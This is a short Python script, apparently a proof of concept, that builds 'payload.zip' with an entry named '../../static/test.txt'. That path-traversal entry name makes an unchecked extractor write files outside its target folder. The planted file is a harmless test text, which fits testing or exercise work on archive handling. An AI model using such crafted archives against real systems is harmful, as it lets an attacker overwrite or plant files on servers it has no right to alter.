from zipfile import ZipFile

with ZipFile("payload.zip", "w") as zipf:
    zipf.write("test.txt", "../../static/test.txt")